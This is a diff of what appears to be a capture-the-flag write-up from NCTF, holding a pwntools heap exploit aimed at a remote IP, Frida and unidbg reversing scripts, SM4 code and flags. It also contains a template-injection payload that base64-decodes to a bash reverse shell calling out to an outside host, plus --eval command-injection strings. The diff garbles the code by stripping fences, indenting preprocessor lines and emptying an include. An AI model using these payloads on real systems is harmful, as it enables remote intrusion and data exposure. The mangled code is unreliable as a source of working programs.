@@ -117,7 +117,8 @@ add(0x28,b'a'+b'n')
 
 _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 
-chunk3=heap_base+0x1970# 伪造的fake_IO结构体的地址
+chunk3=heap_base+0x1970
+# 伪造的fake_IO结构体的地址
 
 orw  = p64(rdi) + p64(heap_base+0x1430)  
 orw += p64(rsi) + p64(0)
@@ -224,7 +225,7 @@ NCTF{Y0u_4r3AAAAAAAAAAAAAAAAAAAAAAAAA}
 
 但需要注意的是0x26不是密文。
 
-#include <iostream>
+#include 
 #include <Windows.h>
 
 int main()
@@ -266,7 +267,7 @@ ChaMd5 Venom 招收大佬入圈
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -281,7 +282,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -299,14 +300,14 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./test-libc.so.6')   
 
 elf=ELF('./pwn')
-#p=remote('',)
-#p = process('./pwn')
-#p = remote('127.0.0.1',9999)
+    #p=remote('',)
+    #p = process('./pwn')
+    #p = remote('127.0.0.1',9999)
 p = remote('39.106.16.204',52351)
 def add(size,content):
         sla(">",str(1))
@@ -359,7 +360,8 @@ add(0x28,b'a'+b'n')
 
 _IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
 
-chunk3=heap_base+0x1970# 伪造的fake_IO结构体的地址
+chunk3=heap_base+0x1970
+# 伪造的fake_IO结构体的地址
 
 orw  = p64(rdi) + p64(heap_base+0x1430)  
 orw += p64(rsi) + p64(0)
@@ -403,51 +405,21 @@ free(4)
 xor=(heap_base+0x7d0>>12)^IO_list_all
 edit(3,p64(0)*3+p64(0x21)+p64(xor)+b'n')
 add(0x17,p64(heap_base+0x1970)+b'n')
-#bug()
+    #bug()
 sla(">",str(5))
 
 inter()
-```
-
-
-
-```
 <%
 t = __import__('os')
 s = getattr(t, 'system')
 s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash')
 %>
-```
-
-
-
-```
 http://127.0.0.2 --eval='import subprocess;subprocess.Popen(chr(108)+chr(115))'
-```
-
-
-
-```
 127.0.0.1 --eval eval("__import__('os').system('env')")
-```
-
-
-
-```
 0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xc4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1
-```
-
-
-
-```
 0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xf4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1
-```
-
-
-
-```
-#include <iostream>
-#include <Windows.h>
+    #include 
+    #include <Windows.h>
 
 int main()
 {
@@ -466,11 +438,6 @@ int main()
     }
 }
 //NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}
-```
-
-
-
-```
 Java.perform(function () {
     var DecStr = Java.use("com.nctf.simplelogin.DecStr");
 
@@ -491,11 +458,6 @@ Java.perform(function () {
         console.log("[*] Decrypted result: " + decrypted);
     });
 });
-```
-
-
-
-```
 package com.killnctf;
 
 import com.github.unidbg.AndroidEmulator;
@@ -608,12 +570,7 @@ publicclass xvideo extends AbstractJni {
         System.out.println("call s result: " + result);
     }
 }
-```
-
-
-
-```
-#include <stdio.h>
+    #include <stdio.h>
 
 void swap_chars(int *a1, int *a2)
 {
@@ -664,12 +621,12 @@ int main()
     return0;
 }
 
-#include <string.h>
-#include <stdio.h>
-#include <time.h>
+    #include <string.h>
+    #include <stdio.h>
+    #include <time.h>
 /*--------------------------------------------------------------------------------------------------------------*/
-#define SM4_ENCRYPT 1
-#define SM4_DECRYPT 0
+    #define SM4_ENCRYPT 1
+    #define SM4_DECRYPT 0
 /*--------------------------------------------------------------------------------------------------------------*/
 /**
  * brief          SM4 context structure
@@ -729,35 +686,35 @@ void sm4_crypt_cbc(sm4_context *ctx,
 /*
  * 32-bit integer manipulation macros (big endian)
  */
-#ifndef GET_ULONG_BE
-#define GET_ULONG_BE(n, b, i)                                                                                                                             
-    {                                                                                                                                                     
-        (n) = ((unsigned long)(b)[(i)] << 24) | ((unsigned long)(b)[(i) + 1] << 16) | ((unsigned long)(b)[(i) + 2] << 8) | ((unsigned long)(b)[(i) + 3]); 
+    #ifndef GET_ULONG_BE
+    #define GET_ULONG_BE(n, b, i)                                                                                                                            
+    {                                                                                                                                                    
+        (n) = ((unsigned long)(b)[(i)] << 24) | ((unsigned long)(b)[(i) + 1] << 16) | ((unsigned long)(b)[(i) + 2] << 8) | ((unsigned long)(b)[(i) + 3]);
     }
-#endif
+    #endif
 /*--------------------------------------------------------------------------------------------------------------*/
-#ifndef PUT_ULONG_BE
-#define PUT_ULONG_BE(n, b, i)                      
+    #ifndef PUT_ULONG_BE
+    #define PUT_ULONG_BE(n, b, i)                      
     {                                              
-        (b)[(i)] = (unsigned char)((n) >> 24);     
-        (b)[(i) + 1] = (unsigned char)((n) >> 16); 
+        (b)[(i)] = (unsigned char)((n) >> 24);    
+        (b)[(i) + 1] = (unsigned char)((n) >> 16);
         (b)[(i) + 2] = (unsigned char)((n) >> 8);  
-        (b)[(i) + 3] = (unsigned char)((n));       
+        (b)[(i) + 3] = (unsigned char)((n));      
     }
-#endif
+    #endif
 /*--------------------------------------------------------------------------------------------------------------*/
 /*
  *rotate shift left marco definition
  *
  */
-#define SHL(x, n) (((x) & 0xFFFFFFFF) << n)
-#define ROTL(x, n) (SHL((x), n) | ((x) >> (32 - n)))
-#define SWAP(a, b)           
+    #define SHL(x, n) (((x) & 0xFFFFFFFF) << n)
+    #define ROTL(x, n) (SHL((x), n) | ((x) >> (32 - n)))
+    #define SWAP(a, b)          
     {                        
-        unsigned long t = a; 
-        a = b;               
-        b = t;               
-        t = 0;               
+        unsigned long t = a;
+        a = b;              
+        b = t;              
+        t = 0;              
     }
 /*--------------------------------------------------------------------------------------------------------------*/
 /*
